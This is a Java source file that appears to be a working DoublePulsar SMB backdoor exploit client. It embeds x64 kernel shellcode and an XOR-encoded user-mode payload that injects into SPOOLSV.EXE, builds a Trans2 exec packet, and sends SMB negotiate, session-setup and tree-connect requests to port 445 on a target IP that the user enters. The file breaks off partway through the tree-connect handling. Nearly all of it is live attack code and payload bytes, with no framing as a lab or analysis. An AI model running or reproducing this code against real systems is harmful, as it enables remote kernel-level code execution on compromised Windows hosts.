import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.util.Scanner;
import java.net.Socket;
import java.util.Arrays;

public class Main {

    /* =========================
     * Raw bytecode blobs
     * ========================= */

    static final byte[] bytecode = new byte[]{
            (byte)0x31, (byte)0xc9, (byte)0x41, (byte)0xe2, (byte)0x01, (byte)0xc3, (byte)0x56, (byte)0x41, (byte)0x57, (byte)0x41, (byte)0x56, (byte)0x41, (byte)0x55, (byte)0x41, (byte)0x54, (byte)0x53,
            (byte)0x55, (byte)0x48, (byte)0x89, (byte)0xe5, (byte)0x66, (byte)0x83, (byte)0xe4, (byte)0xf0, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x4c, (byte)0x8d, (byte)0x35, (byte)0xe3,
            (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x65, (byte)0x4c, (byte)0x8b, (byte)0x3c, (byte)0x25, (byte)0x38, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x8b, (byte)0x7f, (byte)0x04,
            (byte)0x49, (byte)0xc1, (byte)0xef, (byte)0x0c, (byte)0x49, (byte)0xc1, (byte)0xe7, (byte)0x0c, (byte)0x49, (byte)0x81, (byte)0xef, (byte)0x00, (byte)0x10, (byte)0x00, (byte)0x00, (byte)0x49,
            (byte)0x8b, (byte)0x37, (byte)0x66, (byte)0x81, (byte)0xfe, (byte)0x4d, (byte)0x5a, (byte)0x75, (byte)0xef, (byte)0x41, (byte)0xbb, (byte)0x5c, (byte)0x72, (byte)0x11, (byte)0x62, (byte)0xe8,
            (byte)0x18, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xc6, (byte)0x48, (byte)0x81, (byte)0xc6, (byte)0x08, (byte)0x03, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0xbb,
            (byte)0x7a, (byte)0xba, (byte)0xa3, (byte)0x30, (byte)0xe8, (byte)0x03, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xf1, (byte)0x48, (byte)0x39, (byte)0xf0, (byte)0x77,
            (byte)0x11, (byte)0x48, (byte)0x8d, (byte)0x90, (byte)0x00, (byte)0x05, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x39, (byte)0xf2, (byte)0x72, (byte)0x05, (byte)0x48, (byte)0x29, (byte)0xc6,
            (byte)0xeb, (byte)0x08, (byte)0x48, (byte)0x8b, (byte)0x36, (byte)0x48, (byte)0x39, (byte)0xce, (byte)0x75, (byte)0xe2, (byte)0x49, (byte)0x89, (byte)0xf4, (byte)0x31, (byte)0xdb, (byte)0x89,
            (byte)0xd9, (byte)0x83, (byte)0xc1, (byte)0x04, (byte)0x81, (byte)0xf9, (byte)0x00, (byte)0x00, (byte)0x01, (byte)0x00, (byte)0x0f, (byte)0x8d, (byte)0x66, (byte)0x01, (byte)0x00, (byte)0x00,
            (byte)0x4c, (byte)0x89, (byte)0xf2, (byte)0x89, (byte)0xcb, (byte)0x41, (byte)0xbb, (byte)0x66, (byte)0x55, (byte)0xa2, (byte)0x4b, (byte)0xe8, (byte)0xbc, (byte)0x01, (byte)0x00, (byte)0x00,
            (byte)0x85, (byte)0xc0, (byte)0x75, (byte)0xdb, (byte)0x49, (byte)0x8b, (byte)0x0e, (byte)0x41, (byte)0xbb, (byte)0xa3, (byte)0x6f, (byte)0x72, (byte)0x2d, (byte)0xe8, (byte)0xaa, (byte)0x01,
            (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xc6, (byte)0xe8, (byte)0x50, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0x81, (byte)0xf9
    };

    static final byte[] bytecodePartTwo = new byte[]{
            (byte)0x75, (byte)0xbc, (byte)0x49, (byte)0x8b, (byte)0x1e, (byte)0x4d, (byte)0x8d, (byte)0x6e, (byte)0x10, (byte)0x4c, (byte)0x89, (byte)0xea, (byte)0x48, (byte)0x89, (byte)0xd9,
            (byte)0x41, (byte)0xbb, (byte)0xe5, (byte)0x24, (byte)0x11, (byte)0xdc, (byte)0xe8, (byte)0x81, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x6a, (byte)0x40, (byte)0x68, (byte)0x00, (byte)0x10,
            (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x8d, (byte)0x4e, (byte)0x08, (byte)0x49, (byte)0xc7, (byte)0x01, (byte)0x00, (byte)0x10, (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x31, (byte)0xc0,
            (byte)0x4c, (byte)0x89, (byte)0xf2, (byte)0x31, (byte)0xc9, (byte)0x48, (byte)0x89, (byte)0x0a, (byte)0x48, (byte)0xf7, (byte)0xd1, (byte)0x41, (byte)0xbb, (byte)0x4b, (byte)0xca, (byte)0x0a,
            (byte)0xee, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0xe8, (byte)0x52, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x85, (byte)0xc0, (byte)0x0f, (byte)0x85, (byte)0xc8, (byte)0x00,
            (byte)0x00, (byte)0x00, (byte)0x49, (byte)0x8b, (byte)0x3e, (byte)0x48, (byte)0x8d, (byte)0x35, (byte)0xe9, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x31, (byte)0xc9, (byte)0x66, (byte)0x03,
            (byte)0x0d, (byte)0xd7, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x66, (byte)0x81, (byte)0xc1, (byte)0xf9, (byte)0x00, (byte)0xf3, (byte)0xa4, (byte)0x48, (byte)0x89, (byte)0xde, (byte)0x48,
            (byte)0x81, (byte)0xc6, (byte)0x08, (byte)0x03, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xf1, (byte)0x48, (byte)0x8b, (byte)0x11, (byte)0x4c, (byte)0x29, (byte)0xe2, (byte)0x51,
            (byte)0x52, (byte)0x48, (byte)0x89, (byte)0xd1, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0x26, (byte)0x40, (byte)0x36, (byte)0x9d, (byte)0xe8, (byte)0x09,
            (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x83, (byte)0xc4, (byte)0x20, (byte)0x5a, (byte)0x59, (byte)0x48, (byte)0x85, (byte)0xc0, (byte)0x74, (byte)0x18, (byte)0x48, (byte)0x8b,
            (byte)0x80, (byte)0xc8, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x85, (byte)0xc0, (byte)0x74, (byte)0x0c, (byte)0x48, (byte)0x83, (byte)0xc2, (byte)0x4c, (byte)0x8b, (byte)0x02,
            (byte)0x0f, (byte)0xba, (byte)0xe0, (byte)0x05, (byte)0x72, (byte)0x05, (byte)0x48, (byte)0x8b, (byte)0x09, (byte)0xeb, (byte)0xbe, (byte)0x48, (byte)0x83, (byte)0xea, (byte)0x4c, (byte)0x49,
            (byte)0x89, (byte)0xd4, (byte)0x31, (byte)0xd2, (byte)0x80, (byte)0xc2, (byte)0x90, (byte)0x31, (byte)0xc9, (byte)0x41, (byte)0xbb, (byte)0x26, (byte)0xac, (byte)0x50, (byte)0x91, (byte)0xe8,
            (byte)0xc8, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xc1, (byte)0x4c, (byte)0x8d, (byte)0x89, (byte)0x80, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0xc6,
            (byte)0x01, (byte)0xc3, (byte)0x4c, (byte)0x89, (byte)0xe2, (byte)0x49, (byte)0x89, (byte)0xc4, (byte)0x4d, (byte)0x31, (byte)0xc0, (byte)0x41, (byte)0x50, (byte)0x6a, (byte)0x01, (byte)0x49,
            (byte)0x8b, (byte)0x06, (byte)0x50, (byte)0x41, (byte)0x50, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0xac, (byte)0xce, (byte)0x55, (byte)0x4b, (byte)0xe8,
            (byte)0x98, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x31, (byte)0xd2, (byte)0x52, (byte)0x52, (byte)0x41, (byte)0x58, (byte)0x41, (byte)0x59, (byte)0x4c, (byte)0x89, (byte)0xe1, (byte)0x41,
            (byte)0xbb, (byte)0x18, (byte)0x38, (byte)0x09, (byte)0x9e, (byte)0xe8, (byte)0x82, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4c, (byte)0x89, (byte)0xe9, (byte)0x41, (byte)0xbb, (byte)0x22,
            (byte)0xb7, (byte)0xb3, (byte)0x7d, (byte)0xe8, (byte)0x74, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xd9, (byte)0x41, (byte)0xbb, (byte)0x0d, (byte)0xe2, (byte)0x4d,
            (byte)0x85, (byte)0xe8, (byte)0x66, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xec, (byte)0x5d, (byte)0x5b, (byte)0x41, (byte)0x5c, (byte)0x41, (byte)0x5d, (byte)0x41,
            (byte)0x5e, (byte)0x41, (byte)0x5f, (byte)0x5e, (byte)0xc3, (byte)0xe9, (byte)0xb5, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x31, (byte)0xc9, (byte)0x31, (byte)0xc0, (byte)0xac,
            (byte)0x41, (byte)0xc1, (byte)0xc9, (byte)0x0d, (byte)0x3c, (byte)0x61, (byte)0x7c, (byte)0x02, (byte)0x2c, (byte)0x20, (byte)0x41, (byte)0x01, (byte)0xc1, (byte)0x38, (byte)0xe0, (byte)0x75,
            (byte)0xec, (byte)0xc3, (byte)0x31, (byte)0xd2, (byte)0x65, (byte)0x48, (byte)0x8b, (byte)0x52, (byte)0x60, (byte)0x48, (byte)0x8b, (byte)0x52, (byte)0x18, (byte)0x48, (byte)0x8b, (byte)0x52,
            (byte)0x20, (byte)0x48, (byte)0x8b, (byte)0x12, (byte)0x48, (byte)0x8b, (byte)0x72, (byte)0x50, (byte)0x48, (byte)0x0f, (byte)0xb7, (byte)0x4a, (byte)0x4a, (byte)0x45, (byte)0x31, (byte)0xc9,
            (byte)0x31, (byte)0xc0, (byte)0xac, (byte)0x3c, (byte)0x61, (byte)0x7c, (byte)0x02, (byte)0x2c, (byte)0x20, (byte)0x41, (byte)0xc1, (byte)0xc9, (byte)0x0d, (byte)0x41, (byte)0x01, (byte)0xc1,
            (byte)0xe2, (byte)0xee, (byte)0x45, (byte)0x39, (byte)0xd9, (byte)0x75, (byte)0xda, (byte)0x4c, (byte)0x8b, (byte)0x7a, (byte)0x20, (byte)0xc3, (byte)0x4c, (byte)0x89, (byte)0xf8, (byte)0x41,
            (byte)0x51, (byte)0x41, (byte)0x50, (byte)0x52, (byte)0x51, (byte)0x56, (byte)0x48, (byte)0x89, (byte)0xc2, (byte)0x8b, (byte)0x42, (byte)0x3c, (byte)0x48, (byte)0x01, (byte)0xd0, (byte)0x8b,
            (byte)0x80, (byte)0x88, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x01, (byte)0xd0, (byte)0x50, (byte)0x8b, (byte)0x48, (byte)0x18, (byte)0x44, (byte)0x8b, (byte)0x40, (byte)0x20,
            (byte)0x49, (byte)0x01, (byte)0xd0, (byte)0x48, (byte)0xff, (byte)0xc9, (byte)0x41, (byte)0x8b, (byte)0x34, (byte)0x88, (byte)0x48, (byte)0x01, (byte)0xd6, (byte)0xe8, (byte)0x78, (byte)0xff,
            (byte)0xff, (byte)0xff, (byte)0x45, (byte)0x39, (byte)0xd9, (byte)0x75, (byte)0xec, (byte)0x58, (byte)0x44, (byte)0x8b, (byte)0x40, (byte)0x24, (byte)0x49, (byte)0x01, (byte)0xd0, (byte)0x66,
            (byte)0x41, (byte)0x8b, (byte)0x0c, (byte)0x48, (byte)0x44, (byte)0x8b, (byte)0x40, (byte)0x1c, (byte)0x49, (byte)0x01, (byte)0xd0, (byte)0x41, (byte)0x8b, (byte)0x04, (byte)0x88, (byte)0x48,
            (byte)0x01, (byte)0xd0, (byte)0x5e, (byte)0x59, (byte)0x5a, (byte)0x41, (byte)0x58, (byte)0x41, (byte)0x59, (byte)0x41, (byte)0x5b, (byte)0x41, (byte)0x53, (byte)0xff, (byte)0xe0, (byte)0x56,
            (byte)0x41, (byte)0x57, (byte)0x55, (byte)0x48, (byte)0x89, (byte)0xe5, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0xda, (byte)0x16, (byte)0xaf, (byte)0x92,
            (byte)0xe8, (byte)0x4d, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x31, (byte)0xc9, (byte)0x51, (byte)0x51, (byte)0x51, (byte)0x51, (byte)0x41, (byte)0x59, (byte)0x4c, (byte)0x8d, (byte)0x05,
            (byte)0x1a, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x5a, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0x46, (byte)0x45, (byte)0x1b, (byte)0x22, (byte)0xe8,
            (byte)0x68, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x48, (byte)0x89, (byte)0xec, (byte)0x5d, (byte)0x41, (byte)0x5f, (byte)0x5e, (byte)0xc3 };


    static final byte[] payloadBytecode = new byte[]{
            (byte) 0x48, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x81, (byte) 0xe9, (byte) 0xdd, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x48, (byte) 0x8d,
            (byte) 0x05, (byte) 0xef, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x48, (byte) 0xbb, (byte) 0x21, (byte) 0xb7, (byte) 0xcf, (byte) 0x1b, (byte) 0x7c,
            (byte) 0xbb, (byte) 0xab, (byte) 0xac, (byte) 0x48, (byte) 0x31, (byte) 0x58, (byte) 0x27, (byte) 0x48, (byte) 0x2d, (byte) 0xf8, (byte) 0xff, (byte) 0xff,
            (byte) 0xff, (byte) 0xe2, (byte) 0xf4, (byte) 0xdd, (byte) 0xff, (byte) 0x4c, (byte) 0xff, (byte) 0x8c, (byte) 0x53, (byte) 0x6b, (byte) 0xac, (byte) 0x21,
            (byte) 0xb7, (byte) 0x8e, (byte) 0x4a, (byte) 0x3d, (byte) 0xeb, (byte) 0xf9, (byte) 0xfd, (byte) 0x77, (byte) 0xff, (byte) 0xfe, (byte) 0xc9, (byte) 0x19,
            (byte) 0xf3, (byte) 0x20, (byte) 0xfe, (byte) 0x41, (byte) 0xff, (byte) 0x44, (byte) 0x49, (byte) 0x64, (byte) 0xf3, (byte) 0x20, (byte) 0xfe, (byte) 0x01,
            (byte) 0xff, (byte) 0x44, (byte) 0x69, (byte) 0x2c, (byte) 0xf3, (byte) 0xa4, (byte) 0x1b, (byte) 0x6b, (byte) 0xfd, (byte) 0x82, (byte) 0x2a, (byte) 0xb5,
            (byte) 0xf3, (byte) 0x9a, (byte) 0x6c, (byte) 0x8d, (byte) 0x8b, (byte) 0xae, (byte) 0x67, (byte) 0x7e, (byte) 0x97, (byte) 0x8b, (byte) 0xed, (byte) 0xe0,
            (byte) 0x7e, (byte) 0xc2, (byte) 0x5a, (byte) 0x7d, (byte) 0x7a, (byte) 0x49, (byte) 0x41, (byte) 0x73, (byte) 0xf6, (byte) 0x9e, (byte) 0x53, (byte) 0xf7,
            (byte) 0xe9, (byte) 0x8b, (byte) 0x27, (byte) 0x63, (byte) 0x8b, (byte) 0x87, (byte) 0x1a, (byte) 0xac, (byte) 0x30, (byte) 0x2b, (byte) 0x24, (byte) 0x21,
            (byte) 0xb7, (byte) 0xcf, (byte) 0x53, (byte) 0xf9, (byte) 0x7b, (byte) 0xdf, (byte) 0xcb, (byte) 0x69, (byte) 0xb6, (byte) 0x1f, (byte) 0x4b, (byte) 0xf7,
            (byte) 0xf3, (byte) 0xb3, (byte) 0xe8, (byte) 0xaa, (byte) 0xf7, (byte) 0xef, (byte) 0x52, (byte) 0x7d, (byte) 0x6b, (byte) 0x48, (byte) 0xfa, (byte) 0x69,
            (byte) 0x48, (byte) 0x06, (byte) 0x5a, (byte) 0xf7, (byte) 0x8f, (byte) 0x23, (byte) 0xe4, (byte) 0x20, (byte) 0x61, (byte) 0x82, (byte) 0x2a, (byte) 0xb5,
            (byte) 0xf3, (byte) 0x9a, (byte) 0x6c, (byte) 0x8d, (byte) 0xf6, (byte) 0x0e, (byte) 0xd2, (byte) 0x71, (byte) 0xfa, (byte) 0xaa, (byte) 0x6d, (byte) 0x19,
            (byte) 0x57, (byte) 0xba, (byte) 0xea, (byte) 0x30, (byte) 0xb8, (byte) 0xe7, (byte) 0x88, (byte) 0x29, (byte) 0xf2, (byte) 0xf6, (byte) 0xca, (byte) 0x09,
            (byte) 0x63, (byte) 0xf3, (byte) 0xe8, (byte) 0xaa, (byte) 0xf7, (byte) 0xeb, (byte) 0x52, (byte) 0x7d, (byte) 0x6b, (byte) 0xcd, (byte) 0xed, (byte) 0xaa,
            (byte) 0xbb, (byte) 0x87, (byte) 0x5f, (byte) 0xf7, (byte) 0xfb, (byte) 0xb7, (byte) 0xe5, (byte) 0x20, (byte) 0x67, (byte) 0x8e, (byte) 0x90, (byte) 0x78,
            (byte) 0x33, (byte) 0xe3, (byte) 0xad, (byte) 0xf1, (byte) 0xf6, (byte) 0x97, (byte) 0x5a, (byte) 0x24, (byte) 0xe5, (byte) 0xf2, (byte) 0xf6, (byte) 0x60,
            (byte) 0xef, (byte) 0x8e, (byte) 0x42, (byte) 0x3d, (byte) 0xe1, (byte) 0xe3, (byte) 0x2f, (byte) 0xcd, (byte) 0x97, (byte) 0x8e, (byte) 0x49, (byte) 0x83,
            (byte) 0x5b, (byte) 0xf3, (byte) 0xed, (byte) 0x78, (byte) 0xed, (byte) 0x87, (byte) 0x90, (byte) 0x6e, (byte) 0x52, (byte) 0xfc, (byte) 0x53, (byte) 0xde,
            (byte) 0x48, (byte) 0x92, (byte) 0x53, (byte) 0xc6, (byte) 0xba, (byte) 0xab, (byte) 0xac, (byte) 0x21, (byte) 0xb7, (byte) 0xcf, (byte) 0x1b, (byte) 0x7c,
            (byte) 0xf3, (byte) 0x26, (byte) 0x21, (byte) 0x20, (byte) 0xb6, (byte) 0xcf, (byte) 0x1b, (byte) 0x3d, (byte) 0x01, (byte) 0x9a, (byte) 0x27, (byte) 0x4e,
            (byte) 0x30, (byte) 0x30, (byte) 0xce, (byte) 0xc7, (byte) 0x4b, (byte) 0x1e, (byte) 0x0e, (byte) 0x77, (byte) 0xf6, (byte) 0x75, (byte) 0xbd, (byte) 0xe9,
            (byte) 0x06, (byte) 0x36, (byte) 0x53, (byte) 0xf4, (byte) 0xff, (byte) 0x4c, (byte) 0xdf, (byte) 0x54, (byte) 0x87, (byte) 0xad, (byte) 0xd0, (byte) 0x2b,
            (byte) 0x37, (byte) 0x34, (byte) 0xfb, (byte) 0x09, (byte) 0xbe, (byte) 0x10, (byte) 0xeb, (byte) 0x32, (byte) 0xc5, (byte) 0xa0, (byte) 0x71, (byte) 0x7c,
            (byte) 0xe2, (byte) 0xea, (byte) 0x25, (byte) 0xfb, (byte) 0x48, (byte) 0x1a, (byte) 0x75, (byte) 0x13, (byte) 0xcf, (byte) 0xce, (byte) 0xdc, (byte) 0x40,
            (byte) 0xd3, (byte) 0xe1, (byte) 0x7e, (byte) 0x04, (byte) 0xde, (byte) 0xab, (byte) 0xac };

    public static byte[] byteXor(byte[] data, int key) {
        // Convert key to 4 bytes, little-endian
        byte[] keyBytes = ByteBuffer.allocate(4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .putInt(key)
                .array();

        int keyLength = keyBytes.length;
        byte[] result = new byte[data.length];

        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ keyBytes[i % keyLength]);
        }

        return result;
    }

    //usage: writeUInt16LE(treeConnectRequest, userIdOffset, userId);
    static void writeUInt16LE(byte[] buf, int offset, int value) {
        buf[offset]     = (byte) (value & 0xFF);
        buf[offset + 1] = (byte) ((value >> 8) & 0xFF);
    }

    public static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] out = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            out[i / 2] = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
        }
        return out;
    }

    /* =========================
     * Process hash function
     * ========================= */

    public static int generateProcessHash(String process) {
        int procHash = 0;
        String proc = process + "\0"; // null-terminated

        for (char c : proc.toCharArray()) {
            procHash = Integer.rotateRight(procHash, 13);
            procHash = (procHash + c) & 0xFFFFFFFF;
        }
        return procHash;
    }

    public static int calculateDoublepulsarXorKey(int s) {
        long x = (2L * s) ^
                (((s & 0xff00 | (s << 16)) << 8)
                        | (((s >> 16) | (s & 0xff0000)) >> 8));

        // truncate to 32 bits (Python: & 0xffffffff)
        return (int) (x & 0xFFFFFFFFL);
    }

    public static String calculateDoublepulsarArch(long s) {
        if ((s & 0xFFFFFFFF00000000L) == 0) {
            return "x86 (32-bit)";
        } else {
            return "x64 (64-bit)";
        }
    }

    /* =========================
     * Main logic
     * ========================= */

    public static void hexdump(byte[] data, int bytesPerLine) {
        for (int offset = 0; offset < data.length; offset += bytesPerLine) {
            StringBuilder hex = new StringBuilder();
            StringBuilder ascii = new StringBuilder();

            int lineLen = Math.min(bytesPerLine, data.length - offset);

            for (int i = 0; i < lineLen; i++) {
                int b = data[offset + i] & 0xFF;
                hex.append(String.format("%02X ", b));
                ascii.append((b >= 32 && b <= 126) ? (char) b : '.');
            }

            System.out.printf(
                    "%08X  %-48s |%s|%n",
                    offset,
                    hex.toString(),
                    ascii.toString()
            );
        }
    }


    public static int readUInt16LE(byte[] data, int offset) {
        return ByteBuffer.wrap(data, offset, 2)
                .order(ByteOrder.LITTLE_ENDIAN)
                .getShort() & 0xFFFF;
    }

    static class SmbDoublePulsarExecPacket {

        public short SmbMessageType = 0x0000;
        public short SmbMessageLength;

        public byte[] ProtocolHeader = {(byte) 0xFF, 'S', 'M', 'B'};
        public byte SmbCommand = 0x32;

        public int NtStatus = 0x00000000;
        public byte flags = 0x18;
        public short flags2 = (short) 0xC007;

        public short ProcessIDHigh = 0;
        public byte[] signature = new byte[8];

        public short reserved = 0;
        public short TreeId;
        public short ProcessID = (short) 0xFEFF;
        public short UserID;
        public short multipleID = 65;

        // Trans2 header
        public byte wordCount = 15;
        public short totalParameterCount = 12;
        public short totalDataCount = 0;
        public short MaxParameterCount = 1;
        public short MaxDataCount = 0;
        public byte MaxSetupCount = 0;

        public byte reserved1 = 0;
        public short flags1 = 0;
        public int timeout = 0x001a8925;          //FOR PING: 0x00EE3401;
        public short reserved2 = 0;

        public short ParameterCount = 12;
        public short ParamOffset = 66;
        public short DataCount;
        public short DataOffset = 78;

        public byte SetupCount = 1;
        public byte reserved3 = 0;
        public short subcommand = 0x000E;

        public short ByteCount; //4109;
        public byte padding = 0;

        public byte[] SESSION_SETUP_PARAMETERS = new byte[12];

        public byte[] SMB_PAYLOAD = new byte[4096];

        public byte[] toBytes() {

            ByteBuffer buf = ByteBuffer.allocate(4178);
            buf.order(ByteOrder.LITTLE_ENDIAN);

            buf.putShort(SmbMessageType);
            buf.putShort(SmbMessageLength);

            buf.put(ProtocolHeader);
            buf.put(SmbCommand);

            buf.putInt(NtStatus);
            buf.put(flags);
            buf.putShort(flags2);
            buf.putShort(ProcessIDHigh);
            buf.put(signature);

            buf.putShort(reserved);
            buf.putShort(TreeId);
            buf.putShort(ProcessID);
            buf.putShort(UserID);
            buf.putShort(multipleID);

            buf.put(wordCount);
            buf.putShort(totalParameterCount);
            buf.putShort(totalDataCount);
            buf.putShort(MaxParameterCount);
            buf.putShort(MaxDataCount);
            buf.put(MaxSetupCount);

            buf.put(reserved1);
            buf.putShort(flags1);
            buf.putInt(timeout);
            buf.putShort(reserved2);

            buf.putShort(ParameterCount);
            buf.putShort(ParamOffset);
            buf.putShort(DataCount);
            buf.putShort(DataOffset);

            buf.put(SetupCount);
            buf.put(reserved3);
            buf.putShort(subcommand);

            buf.putShort(ByteCount);
            buf.put(padding);

            buf.put(SESSION_SETUP_PARAMETERS);
            buf.put(SMB_PAYLOAD);

            return buf.array();
        }
    }

    public static void main(String[] args) throws Exception
    {
        //Test phase: Using a structure generate a Doublepulsar SMB Trans2 Exec Packet
        SmbDoublePulsarExecPacket packet = new SmbDoublePulsarExecPacket();

        packet.totalDataCount = (short) 4096;
        packet.DataCount = (short) 4096;
        packet.ByteCount = (short) 4109;
        packet.TreeId = (short) 0x0008;
        packet.UserID = (short) 0x0008;
        //packet.SESSION_SETUP_PARAMETERS;
        //packet.SMB_PAYLOAD;

        //packet.SmbMessageLength = (short)(packet.toBytes().length - 4);
        // Calculate dynamic length if needed
        packet.SmbMessageLength = (short)(packet.toBytes().length - 4);

        byte[] rawPacket = packet.toBytes();
        hexdump(rawPacket, 16);
        //out.write(rawPacket);


        //build the shellcode

        /* build the shellcode */
        String procName = "SPOOLSV.EXE";
        int procHash = generateProcessHash(procName);

        System.out.printf(
                "Process Hash for %s: 0x%08X%n",
                procName, procHash
        );

        byte[] hMem = new byte[4096];

        int bytecodeOneLen = bytecode.length;
        int bytecodeTwoLen = bytecodePartTwo.length;
        int ring3Len = payloadBytecode.length;

        int kernelBytecodeSize = bytecodeOneLen + bytecodeTwoLen + 4;

        // Fill with 0x90 (NOP)
        Arrays.fill(hMem, (byte) 0x90);

        // proc_hash -> little endian
        byte[] procHashBytes = ByteBuffer.allocate(4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .putInt(procHash)
                .array();

        // Copy first bytecode
        System.arraycopy(bytecode, 0, hMem, 0, bytecodeOneLen);

        // Copy process hash
        System.arraycopy(procHashBytes, 0, hMem, bytecodeOneLen, 4);

        // Copy second bytecode
        System.arraycopy(
                bytecodePartTwo,
                0,
                hMem,
                bytecodeOneLen + 4,
                bytecodeTwoLen
        );

        // ring3 length (2 bytes, little endian)
        byte[] ring3LenBytes = ByteBuffer.allocate(2)
                .order(ByteOrder.LITTLE_ENDIAN)
                .putShort((short) ring3Len)
                .array();

        System.arraycopy(
                ring3LenBytes,
                0,
                hMem,
                kernelBytecodeSize,
                2
        );

        // Copy ring3 payload
        System.arraycopy(
                payloadBytecode,
                0,
                hMem,
                kernelBytecodeSize + 2,
                ring3Len
        );

        // Final payload
        byte[] modifiedKernelBytecode = Arrays.copyOf(hMem, hMem.length);
        System.out.println("\nHexdump of modifiedKernelBytecode:");
        hexdump(modifiedKernelBytecode, 16);
        System.out.println("Final payload size: " + modifiedKernelBytecode.length);

        /* =========================
         * Packets
         * ========================= */

        byte[] negotiateProtocolRequest = hexToBytes(
                "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200"
        );

        byte[] sessionSetupRequest = hexToBytes(
                "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000"
        );

        byte[] treeConnectRequest = hexToBytes(
                "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00"
        );

        byte[] trans2SessionSetup = hexToBytes(
                "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000"
        );

        /* =========================
         * Connection
         * ========================= */

        //String ip = "192.168.0.248";
        System.out.print("Enter IP address: ");
        Scanner scanner = new Scanner(System.in);
        String ip = scanner.nextLine();

        int port = 445;
        int timeoutMillis = 5000;

        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(ip, port), timeoutMillis);
        socket.setSoTimeout(timeoutMillis);

        InputStream in = socket.getInputStream();
        OutputStream out = socket.getOutputStream();

        byte[] buffer = new byte[1024];

        /* =========================
         * Negotiate protocol
         * ========================= */

        System.out.println("Sending negotiation protocol request");
        out.write(negotiateProtocolRequest);
        in.read(buffer);

        /* =========================
         * Session setup
         * ========================= */

        int userIdOffset = 0x28;
        int treeIdOffset = 0x24;

        System.out.println("Sending session setup request");
        out.write(sessionSetupRequest);
        int sessionRespLen = in.read(buffer);
        byte[] sessionSetupResponse = Arrays.copyOf(buffer, sessionRespLen);

        ByteBuffer UserIDBuffer = ByteBuffer.wrap(sessionSetupResponse);
        UserIDBuffer.order(ByteOrder.LITTLE_ENDIAN); // SMB uses little-endian

        int userid = UserIDBuffer.getShort(0x20) & 0xFFFF; // convert to unsigned
        System.out.println("UserID: " + userid);

        //int userId = readUInt16LE(sessionSetupResponse, 32);
        System.out.printf("User ID = %d\n", userid);

        /* =========================
         * Tree connect (update UID)
         * ========================= */

        // 3) Copy UserID to TreeConnect Request
        // -----------------------

        // Assuming TreeConnect packet expects USERID at offset 0x28 (example)

        treeConnectRequest[userIdOffset]     = (byte) (userid & 0xFF);
        treeConnectRequest[userIdOffset + 1] = (byte) ((userid >> 8) & 0xFF);

        System.out.println("Sending tree connect request");
        out.write(treeConnectRequest);
        int treeRespLen = in.read(buffer);
        byte[] treeConnectResponse = Arrays.copyOf(buffer, treeRespLen);

        ByteBuffer treeRespBuffer = ByteBuffer.wrap(treeConnectResponse);
        treeRespBuffer.order(ByteOrder.LITTLE_ENDIAN);

        // Extract TreeID at offset 0x24 (36 decimal)
